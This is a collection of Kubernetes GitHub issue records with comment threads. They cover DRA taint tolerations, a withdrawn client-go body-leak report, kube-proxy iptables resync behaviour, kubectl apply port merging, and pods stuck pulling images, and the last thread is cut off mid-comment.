{"repo": "kubernetes/kubernetes", "issue_number": 134434, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134434", "issue_title": "DRA: Device Taints: tolerating NoExecute is broken", "issue_author": "pohly", "issue_body": "### What happened?\n\nWhen a ResourceClaim is affected by a NoExecute taint and has a toleration for that taint, then the scheduler schedules a Pod using that ResourceClaim correctly. But it does not copy the toleration into the allocation result and then the eviction controller evicts the Pod more or less instantaneously before it even starts to run.\n\n### What did you expect to happen?\n\nPod should run.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nSee description.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\nKubernetes >= 1.33 where the feature was introduced.\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-sig", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "pohly", "body": "/assign\n"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134219, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134219", "issue_title": "resp.Body not closed in transformResponse in client-go may cause memory leak", "issue_author": "oscarzhou", "issue_body": "### What happened?\n\nIn staging/src/k8s.io/client-go/rest/request.go, within the transformResponse function, the HTTP response body (resp.Body) is read using io.ReadAll, but is not explicitly closed afterward. According to Go best practices, failing to close the response body can lead to resource leaks, particularly file descriptors or sockets, over time or under high load. This has the potential to degrade performance or cause failures in API clients using client-go.\n\nReference:\nhttps://github.com/kubernetes/client-go/blob/master/rest/request.go#L1177\n\n<img width=\"1896\" height=\"805\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b610ea34-9232-436a-9be7-e00d170a579c\" />\n\n\n### What did you expect to happen?\n\nI expected resp.Body to be closed after reading its contents, following Go best practices for HTTP response handling, to ensure network resources are properly released.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n- Use a client-go-based controller or CLI that makes repeated API requests to the Kubernetes API server.\n- Monitor file descriptor usage or open sockets on the client process.\n- Observe that over time, these resources are not released as expected, indicating a leak.\n\n### Anything else we need to know?\n\n- The fix is to add defer resp.Body.Close() immediately after confirming resp.Body != nil and before reading the body.\n- See Go\u2019s [http.Response documentation](https://pkg.go.dev/net/http#Response) for details on why response bodies must be closed.\n- This issue can lead to resource exhaustion on long-running controllers or high-traffic clients.\n\n### Kubernetes version\n\nAffected in all recent versions using current client-go (e.g., v0.33.x, v0.34.x)\n\n\n### Cloud provider\n\n<details>\nAWS\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/api-machinery", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "oscarzhou", "body": "/sig cli"}, {"author": "AadiDev005", "body": "Thanks for reporting this, @oscarzhou! This is indeed a critical resource management issue that needs attention. The missing defer resp.Body.Close() in the transformResponse function violates Go's HTTP response handling best practices and can lead to accumulated file descriptors and TCP connections over time.\n\nI can confirm this particularly impacts long-running controllers and high-throughput API clients where these leaked resources compound. The fix is straightforward - adding defer resp.Body.Close() immediately after confirming resp.Body != nil - but the impact is significant for production environments."}, {"author": "ardaguclu", "body": "/sig api-machinery"}, {"author": "mpuckett159", "body": "/remove-sig cli\nThank you for reporting this but this is owned by sig-apimachinery so I will let them determine how best to resolve this."}, {"author": "aojea", "body": "please see @Jefftree comment in the associated PR\n\n> response body is closed in all code paths that call the private function transformResponse.\n\nStream: https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/rest/request.go#L935\nWatch: https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/rest/request.go#L801\nDo: https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/rest/request.go#L1100\n\ncan you be more concrete and specific about the leak you are observing?\n"}, {"author": "oscarzhou", "body": "@aojea Sorry, I forgot to provide an update.\nI\u2019ve identified the root cause of the leak. it\u2019s not related to `resp.Body` not being closed. As Jefftree mentioned, `resp.Body` is properly closed by the higher-level caller through `defer readAndCloseResponseBody(resp)`. The actual issue lies in how the kube API client is created and managed in our project.\n\nWe can close this issue and the corresponding PR: https://github.com/kubernetes/kubernetes/pull/134220\nThanks"}, {"author": "aojea", "body": "/close\n\nno worries, thanks for letting us know"}, {"author": "k8s-ci-robot", "body": "@aojea: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/134219#issuecomment-3383198912):\n\n>/close\n>\n>no worries, thanks for letting us know\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133767, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133767", "issue_title": "kube-proxy config option --iptables-sync-period only works in specific cases", "issue_author": "nareshku", "issue_body": "### What happened?\n\nHello, Regarding the **kube-proxy** `--iptables-sync-period` config option. The official description says:\n\n```\nAn interval (e.g. '5s', '1m', '2h22m') indicating how frequently various re-synchronizing and cleanup operations are performed. Must be greater than 0.\n```\n\nHowever, the actual sync occurs every 1 hour. \nhttps://sourcegraph.com/github.com/kubernetes/kubernetes@release-1.25/-/blob/pkg/proxy/iptables/proxier.go?L326\n\nAdditionally, it appears that the sync doesn't occur even if the NAT table is flushed. \nOutside the changes to the Endpoints resources when the re-sync is expected, the only other case where the re-sync will occur is when **KUBE-PROXY-CHAIN** is modified/deleted in the `mangle` table.\nhttps://sourcegraph.com/github.com/kubernetes/kubernetes@release-1.25/-/blob/pkg/proxy/iptables/proxier.go?L328\n\nI think the description should be updated to reflect this if this is the expected behavior.\n\n### What did you expect to happen?\n\nThe description of `--iptables-sync-period` should clearly mention when the re-synchronization occurs.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n- Flush iptables `nat` table\n- `kube-proxy` doesn't re-sync the iptables rules within the defined `--iptables-sync-period`\n- Delete the iptables `mangle` `KUBE-PROXY-CHAIN` and re-sync works this time.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```\nkube-proxy version `v1.25`\n```\nProbably this applies to future versions as well.\n\n</details>\n\n\n### Cloud provider\n\n<details>\non prem\n</details>\n\n\n### OS version\n\n<details>\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/network", "triage/needs-information"], "comments": [{"author": "BenTheElder", "body": "/sig network\n\n> https://sourcegraph.com/github.com/kubernetes/kubernetes@release-1.25/-/blob/pkg/proxy/iptables/proxier.go?L326\n\nFYI 1.25 is very out of date and out of support: https://kubernetes.io/releases/\n\nThat said, this is what it looks like currently:\n https://github.com/kubernetes/kubernetes/blob/be361a18dda0f2fab1f5e25f8067a9ed43fc3b89/pkg/proxy/iptables/proxier.go#L313\n\nWe should probably update the docs to clarify that 1h is the maximum. \n\nWere you attempting to sync less frequently than 1h? For what purpose?"}, {"author": "nareshku", "body": "Thanks for responding @BenTheElder. We have a distributed firewall mechanism that works alongside of kube-proxy. There are a few scenarios where the iptables can be flushed and 1hr wait time to recover isn't feasible for our environment.\n\nI see the till v1.32 the behavior is same, the latest code you shared appears to be applicable from v1.34 ref #131615.\n\n(Looks like the issue is very similar to #129128, linking here in case any wants to get more context.)"}, {"author": "BenTheElder", "body": "> There are a few scenarios where the iptables can be flushed and 1hr wait time to recover isn't feasible for our environment.\n\nRight, so you're *not* trying to use >1h then right?\n\nYou can set a lower interval, and the default is 30s (sync period) / 1s (min)\nhttps://github.com/kubernetes/kubernetes/blob/d5065bdf192b2ebb723657b3432c66ce3ea15b23/pkg/proxy/apis/config/v1alpha1/defaults.go#L62-L67\n\nIt's possible there was some confusion/overriding between config and flags?\n\n---\n\nEDIT: Clearly the flag info should be corrected to not suggest a value greater than the maximum, and to document the maximum."}, {"author": "aojea", "body": "@danwinship is the expert of this area"}, {"author": "nareshku", "body": ">Right, so you're not trying to use >1h then right?\nNo, we actually want it to sync at a specified `--iptables-sync-period`.\n\nBased on the below code (<= v1.32), it only does sync at a 1 hour and doesn't honor `--iptables-sync-period`. You can check the below function call that handles the sync.\nhttps://github.com/kubernetes/kubernetes/blob/release-1.32/pkg/proxy/iptables/proxier.go#L328"}, {"author": "danwinship", "body": "> ```\n> An interval (e.g. '5s', '1m', '2h22m') indicating how frequently various re-synchronizing and cleanup operations are performed. Must be greater than 0.\n> ```\n> \n> However, the actual sync occurs every 1 hour.\n\nThe docs say that it controls \"various re-synchronizing and cleanup operations\". It doesn't say it controls every possible resync. (The docs are vague about exactly what it does, because it doesn't really do anything super useful any more, because the code doesn't work the same way it did when that option was added.)\n\n> We have a distributed firewall mechanism that works alongside of kube-proxy. There are a few scenarios where the iptables can be flushed and 1hr wait time to recover isn't feasible for our environment.\n\nkube-proxy assumes that when firewalls flush the iptables rules, they will flush _all_ iptables rules in all tables (because that's how all of the standard distro firewall services work). If you have your own firewall system and you need to flush iptables, you should do something like:\n\n```sh\nfor table in filter nat raw mangle; do\n    iptables -t ${table} -F\n    iptables -t ${table} -X\ndone\n```\n\nAnd kube-proxy will notice that and recover. (kube-proxy has to poll `mangle` rather than `nat` because iptables is terrible, and polling `nat` regularly would slow kube-proxy syncing down by creating contention for the iptables lock.)\n\n(This isn't documented because that's the way all firewall systems we were aware of already worked, so there didn't really seem to be any need to document it.)\n\n(And FTR, one of the things `--iptables-sync-period` controls is how often it polls to see if its canary chains have been deleted, so if the default 30s is too high, you can change that. Though, in that case, you should really try to make it so your firewall doesn't need to flush kube-proxy's rules...)"}, {"author": "aojea", "body": "@nareshku can you please check last comment and let us know if that is a valid answer? is it possible you can adapt your firewall mechanism to be compatible with kube-proxy logic?"}, {"author": "danwinship", "body": "/triage needs-information"}, {"author": "nareshku", "body": "> [@nareshku](https://github.com/nareshku) can you please check last comment and let us know if that is a valid answer? is it possible you can adapt your firewall mechanism to be compatible with kube-proxy logic?\n\nThanks @danwinship for detailed context. I am good with this. It was just that the docs were unclear about some the expectations and thus I raised this.\n\n@aojea We can close this."}, {"author": "aojea", "body": "thanks\n\n/close"}, {"author": "k8s-ci-robot", "body": "@aojea: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133767#issuecomment-3383179187):\n\n>thanks\n>\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134470, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134470", "issue_title": "kubectl apply fails to update container ports section on reapply", "issue_author": "priteshkadav", "issue_body": "### What happened?\n\nCreate a sts using kubectl apply with following manifest\n```\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nginx-statefulset\nspec:\n  replicas: 2\n  serviceName: nginx-service\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:latest\n        ports:\n        - name: http-port\n          containerPort: 80\n        - containerPort: 8080\n          name: p-35b22f0ec56b2\n        - containerPort: 8090\n          name: p-776a6f40d6d71\n        - containerPort: 8080\n          name: p-0ff1e8bce95ec\n        - containerPort: 8080\n          name: p-7762564715c2a\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http-port\n          initialDelaySeconds: 5\n          periodSeconds: 10\n```\n\nThen apply the new below manifest using same kubectl apply method\n```\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nginx-statefulset\nspec:\n  replicas: 2\n  serviceName: nginx-service\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:latest\n        ports:\n        - name: http-port\n          containerPort: 80\n        - containerPort: 8080\n          name: p-1ae69570b6455\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http-port\n          initialDelaySeconds: 5\n          periodSeconds: 10\n```\nAs we can see the ports section is changed in both these manifests, but after applying second manifest I can only see \n```\n- name: http-port\ncontainerPort: 80\n```\nin the kubernetes resource.\n\n### What did you expect to happen?\n\nExpectation is to have the ports of second manifest on the resource\n```\n- name: http-port\ncontainerPort: 80\n- containerPort: 8080\nname: p-1ae69570b6455\n```\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nAs given above\n\n### Anything else we need to know?\n\nNA\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.29.15\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\nServer Version: v1.29.15\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nOn prem\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\nNAME=\"Ubuntu\"\nVERSION=\"20.04.6 LTS (Focal Fossa)\"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=\"Ubuntu 20.04.6 LTS\"\nVERSION_ID=\"20.04\"\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\nVERSION_CODENAME=focal\nUBUNTU_CODENAME=focal\n$ uname -a\nLinux k8s-master-0 5.4.0-216-generic #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/api-machinery", "sig/cli", "triage/duplicate"], "comments": [{"author": "priteshkadav", "body": "/sig cli\n/sig api-machinery\n/wg serving\n/committee code-of-conduct"}, {"author": "priteshkadav", "body": "/sig cli\n/sig api-machinery"}, {"author": "liggitt", "body": "I think this is a duplicate of https://github.com/kubernetes/kubernetes/issues/58477"}, {"author": "liggitt", "body": "The `containerPort` field is the key used to determine item identity\n\nThe initial manifest incorrectly contains multiple entries which appear to have the same identity. The subsequent update to drop *some* of those is treated as a removal of that key, which is applied to remove all items of that key"}, {"author": "BenTheElder", "body": "This is not a [Code Of Conduct](https://kubernetes.io/community/code-of-conduct/) issue.\n/remove-committee code-of-conduct\nNor is it a [SIG Testing](https://github.com/kubernetes/community/tree/master/sig-testing) issue or [WG Serving](https://github.com/kubernetes/community/tree/master/wg-serving) issue\n/remove-sig testing\n/remove-wg serving\n\n/sig cli api-machinery\n"}, {"author": "liggitt", "body": "/close\nas a duplicate of https://github.com/kubernetes/kubernetes/issues/58477"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 83471, "issue_url": "https://github.com/kubernetes/kubernetes/issues/83471", "issue_title": "Pods get stuck in ContainerCreating state when pulling image takes long", "issue_author": "emptywee", "issue_body": "**What happened**:\r\nIf pulling a docker image takes a bit longer than usual, pods are never created.\r\n\r\n\r\n**What you expected to happen**:\r\nKubernetes to wait or retry pulling.\r\n\r\n**How to reproduce it (as minimally and precisely as possible)**:\r\nThrottle download speed to the docker registry where you are pulling it from or find one that gives you low bandwidth, e.g. 512kbit/s\r\n\r\n**Anything else we need to know?**:\r\nAn example where it hangs for over 15m already. Of course, if I go to the worker node and do manual docker pull it'll complete within a few minutes. We've seen even longer age since pod creation. And it's been happening on older kubernetes versions as well. I bet it'll be the same on 1.14 and newer.\r\n\r\n```\r\n$ kubectl -n spinnaker describe pod spin-gate-55999bc58-47zz7\r\nName:           spin-gate-55999bc58-47zz7\r\nNamespace:      spinnaker\r\nPriority:       0\r\nNode:           depkbw102/10.16.53.35\r\nStart Time:     Thu, 03 Oct 2019 19:43:27 +0000\r\nLabels:         app=gate\r\n                load-balancer-spin-gate=true\r\n                pod-template-hash=55999bc58\r\nAnnotations:    cni.projectcalico.org/podIP: 10.23.130.18/32\r\n                prometheus.io/path: /prometheus_metrics\r\n                prometheus.io/port: 8008\r\n                prometheus.io/scrape: true\r\nStatus:         Pending\r\nIP:             \r\nIPs:            <none>\r\nControlled By:  ReplicaSet/spin-gate-55999bc58\r\nContainers:\r\n  gate:\r\n    Container ID:   \r\n    Image:          dockerregistry.example.com/devops/spinnaker-gate:v1.15.3-49\r\n    Image ID:       \r\n    Port:           8084/TCP\r\n    Host Port:      0/TCP\r\n    State:          Waiting\r\n      Reason:       ContainerCreating\r\n    Ready:          False\r\n    Restart Count:  0\r\n    Readiness:      http-get https://:8084/health delay=20s timeout=1s period=10s #success=1 #failure=3\r\n    Environment:\r\n      JAVA_OPTS:  -Xms1g -Xmx4g\r\n      DUMMY:      dummy10\r\n    Mounts:\r\n      /opt/spinnaker/certs from spinnaker-ssl (rw)\r\n      /opt/spinnaker/config from spinnaker-config (rw)\r\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-gt426 (ro)\r\n  monitoring:\r\n    Container ID:   \r\n    Image:          gcr.io/spinnaker-marketplace/monitoring-daemon:0.14.0-20190702202823\r\n    Image ID:       \r\n    Port:           8008/TCP\r\n    Host Port:      0/TCP\r\n    State:          Waiting\r\n      Reason:       ContainerCreating\r\n    Ready:          False\r\n    Restart Count:  0\r\n    Environment:    <none>\r\n    Mounts:\r\n      /opt/spinnaker-monitoring/config from monitoring-config (rw)\r\n      /opt/spinnaker-monitoring/registry from monitoring-registry (rw)\r\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-gt426 (ro)\r\nConditions:\r\n  Type              Status\r\n  Initialized       True \r\n  Ready             False \r\n  ContainersReady   False \r\n  PodScheduled      True \r\nVolumes:\r\n  spinnaker-config:\r\n    Type:        Secret (a volume populated by a Secret)\r\n    SecretName:  spinnaker-config\r\n    Optional:    false\r\n  spinnaker-ssl:\r\n    Type:        Secret (a volume populated by a Secret)\r\n    SecretName:  spinnaker-ssl\r\n    Optional:    false\r\n  monitoring-config:\r\n    Type:      ConfigMap (a volume populated by a ConfigMap)\r\n    Name:      monitoring-config\r\n    Optional:  false\r\n  monitoring-registry:\r\n    Type:      ConfigMap (a volume populated by a ConfigMap)\r\n    Name:      monitoring-registry\r\n    Optional:  false\r\n  default-token-gt426:\r\n    Type:        Secret (a volume populated by a Secret)\r\n    SecretName:  default-token-gt426\r\n    Optional:    false\r\nQoS Class:       BestEffort\r\nNode-Selectors:  <none>\r\nTolerations:     node.kubernetes.io/not-ready:NoExecute for 300s\r\n                 node.kubernetes.io/unreachable:NoExecute for 300s\r\nEvents:\r\n  Type    Reason     Age   From                Message\r\n  ----    ------     ----  ----                -------\r\n  Normal  Scheduled  15m   default-scheduler   Successfully assigned spinnaker/spin-gate-55999bc58-47zz7 to depkbw102\r\n  Normal  Pulling    15m   kubelet, depkbw102  pulling image \"dockerregistry.example.com/devops/spinnaker-gate:v1.15.3-49\"\r\n```\r\n\r\n**Environment**:\r\n- Kubernetes version (use `kubectl version`):\r\n```\r\nClient Version: version.Info{Major:\"1\", Minor:\"16\", GitVersion:\"v1.16.0\", GitCommit:\"2bd9643cee5b3b3a5ecbd3af49d09018f0773c77\", GitTreeState:\"clean\", BuildDate:\"2019-09-18T14:36:53Z\", GoVersion:\"go1.12.9\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\nServer Version: version.Info{Major:\"1\", Minor:\"13\", GitVersion:\"v1.13.11\", GitCommit:\"25074a190ef2a07d8b0ed38734f2cb373edfb868\", GitTreeState:\"clean\", BuildDate:\"2019-09-18T14:34:46Z\", GoVersion:\"go1.11.13\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\n```\r\n- Cloud provider or hardware configuration:\r\nVMware ESXi 6.5\r\n\r\n- OS (e.g: `cat /etc/os-release`):\r\n```\r\nNAME=\"Container Linux by CoreOS\"\r\nID=coreos\r\nVERSION=2191.5.0\r\nVERSION_ID=2191.5.0\r\nBUILD_ID=2019-09-04-0357\r\nPRETTY_NAME=\"Container Linux by CoreOS 2191.5.0 (Rhyolite)\"\r\nANSI_COLOR=\"38;5;75\"\r\nHOME_URL=\"https://coreos.com/\"\r\nBUG_REPORT_URL=\"https://issues.coreos.com\"\r\nCOREOS_BOARD=\"amd64-usr\"\r\n```\r\n\r\n- Kernel (e.g. `uname -a`):\r\n```\r\nLinux depkbw102 4.19.68-coreos #1 SMP Wed Sep 4 02:59:18 -00 2019 x86_64 Intel(R) Xeon(R) CPU E5-2660 v2 @ 2.20GHz GenuineIntel GNU/Linux\r\n```\r\n- Install tools:\r\n\r\ncoreos ova with ignition config passed\r\n\r\n- Network plugin and version (if this is a network-related bug):\r\ncalico 3.5.4\r\n", "issue_labels": ["kind/bug", "priority/backlog", "sig/node", "triage/needs-information"], "comments": [{"author": "emptywee", "body": "/sig scheduling"}, {"author": "zouyee", "body": "/sig node\r\n/remove-sig scheduling"}, {"author": "zouyee", "body": "https://github.com/kubernetes/kubernetes/issues/83348"}, {"author": "emptywee", "body": "> \r\n> \r\n> #83348\r\n\r\nIn our case there's no events and no errors passed from kubelet to the api server. Not sure how #83348 is related. What's helping to start a container is predownload the image on the worker node and kill the pod, hoping that it'll get re-created on the same node. Or, pre-download that image on all workers and kill the pod."}, {"author": "SataQiu", "body": "/cc"}, {"author": "langyenan", "body": "Have you tried set `--serialize-image-pulls=false` when starting kubelet? \r\n\r\nBy default, that flag is `true`, which means kubelet pulls images one by one. I think the pulling is not stuck, they are just waiting for the current one to be finished.\r\n\r\nbelow is the serial image puller, you see, one slow pulling may stuck all the pullings on the node :\r\nhttps://github.com/kubernetes/kubernetes/blob/ca0e694d637f9e6feffd7330f66b081769c1c91b/pkg/kubelet/images/puller.go#L60-L95\r\n"}, {"author": "emptywee", "body": "@langyenan this is definitely interesting... I'll experiment with this flag and see how it improves/worsens our problem :) Thanks!"}, {"author": "emptywee", "body": "@langyenan any idea why this param is not configurable?\r\n\r\nhttps://github.com/kubernetes/kubernetes/blob/ca0e694d637f9e6feffd7330f66b081769c1c91b/pkg/kubelet/images/puller.go#L58"}, {"author": "langyenan", "body": "> @langyenan any idea why this param is not configurable?\r\n> \r\n> https://github.com/kubernetes/kubernetes/blob/ca0e694d637f9e6feffd7330f66b081769c1c91b/pkg/kubelet/images/puller.go#L58\r\n\r\nNop, but even if it is configurable, there is still only one pulling at a time. "}, {"author": "emptywee", "body": "@langyenan one pulling at a time even with `--serialize-image-pulls=false` ? What difference is it going to make then?"}, {"author": "langyenan", "body": "> @langyenan one pulling at a time even with `--serialize-image-pulls=false` ? What difference is it going to make then?\r\n\r\nwith `false`, a parallel puller is used:\r\nhttps://github.com/kubernetes/kubernetes/blob/ca0e694d637f9e6feffd7330f66b081769c1c91b/pkg/kubelet/images/puller.go#L39-L55"}, {"author": "emptywee", "body": "@langyenan Oh, I thought that const was also used for parallel pulling. My bad, need more sleep. Thanks for the hint!"}, {"author": "erenatas", "body": "I am having this issue right now. Pods are either stuck at ContainerCreating or Init because it says it's pulling the image.\r\n\r\nI go to the node that it's trying to pull the image and pull the docker image manually. It's still stuck."}, {"author": "fejta-bot", "body": "Issues go stale after 90d of inactivity.\nMark the issue as fresh with `/remove-lifecycle stale`.\nStale issues rot after an additional 30d of inactivity and eventually close.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/lifecycle stale"}, {"author": "franckleveque", "body": "Same problem here, pods get stuck on ContainerCreating step. when trying a kubectl describe pod, it indicate that last event is a Pulling event ie :\r\n\r\nNormal  Pulling    13m   kubelet, franck-lenovo-z70-80  Pulling image \"jboss/keycloak\""}, {"author": "rajatnt", "body": "> Same problem here, pods get stuck on ContainerCreating step. when trying a kubectl describe pod, it indicate that last event is a Pulling event ie :\r\n> \r\n> Normal Pulling 13m kubelet, franck-lenovo-z70-80 Pulling image \"jboss/keycloak\"\r\n\r\nFacing ditto the same issue. Also, on my all in one Kube setup, I pulled the docker image manually. It's still stuck.\r\n\r\n```\r\nEvents:\r\n  Type    Reason     Age   From                     Message\r\n  ----    ------     ----  ----                     -------\r\n  Normal  Scheduled  29m   default-scheduler        Successfully assigned <namespace>/<pod-that-is-stuck> to docker-desktop\r\n  Normal  Pulling    29m   kubelet, docker-desktop  Pulling image <image-for-the-pod-that-is-stuck>\r\n```\r\n"}, {"author": "holmesb", "body": "Yes we're also seeing this \"Pulling image\", even when said image already exists on the node that we've manually 'docker pulled'.  Eventually seems to sort itself out and pods start.  If there really is a \"blocking\" image being pulled when `--serialize-image-pulls=true`, then is there any way of detecting which image is being pulled?  Dockerd logs aren't clear.  \r\nIs there a downside of disabling serialize-image-pulls?  [Docs ](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)don't recommend for older dockerd and aufs storage backend, which we don't have."}, {"author": "fejta-bot", "body": "Stale issues rot after 30d of inactivity.\nMark the issue as fresh with `/remove-lifecycle rotten`.\nRotten issues close after an additional 30d of inactivity.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/lifecycle rotten"}, {"author": "erenatas", "body": "/remove-lifecycle rotten\r\n\r\nThis issue needs to be taken care of. It is a major problem."}, {"author": "riking", "body": "Just had to try to support an outage caused by all 2 pods of a deployment getting stuck in image pull. The image is nowhere near gigabytes in size and shouldn't take more than ~2-3min to pull."}, {"author": "skyfirst93", "body": "I have observed this issue where at least 20 pods were stuck in the same state mentioned in the issue description. \r\nI just restarted the kubelet service and all the pods came up. \r\nIt will be helpful if someone could help on how to prevent this from happening. :/ "}, {"author": "danieltroger", "body": "Was this solved? Also experiencing the issue"}, {"author": "Shahard2", "body": "i see this as well on eks (image size is 2GB)"}, {"author": "GertjanBijl", "body": "Had the same issue today on OpenShift 4.3.33, which is Kubernetes Version: v1.16.2+295f6e6. Coincidentally (or not) I also had this while pulling Spinnaker.\r\nDeleting a single pod helps, because that pod came up running after a short while. After deleting all pods one by one, they all pull correctly and started running. I monitored network traffic on my Squid-proxy, and I saw no traffic at all while the pods were in 'ContainerCreating' status and according the status they were pulling the image, but apparently they were actually not."}, {"author": "paol", "body": "Just had this problem affecting 6 nodes of a 7 node cluster. Restarting the kubelet service appears to clear the problem.\r\n\r\nKubernetes v1.18.3\r\n\r\nEdit:\r\nThis correlates with the following error message repeating over and over in the kubelet logs:\r\n```\r\nFailed to get system container stats for \"/system.slice/docker.service\": failed to get cgroup stats for \"/system.slice/docker.service\": failed to get container info for \"/system.slice/docker.service\": unknown container \"/system.slice/docker.service\"\r\n```\r\n\r\nFound issue 56850 related to this message, but it's quite old and specific to RedHat (we're on Ubuntu server 18.04) so I don't think it's exactly the same."}, {"author": "Shahard2", "body": "> Just had this problem affecting 6 nodes of a 7 node cluster. Restarting the kubelet service appears to clear the problem.\r\n> \r\n> Kubernetes v1.18.3\r\n\r\nand if I'm on eks ?"}, {"author": "harrypalheta", 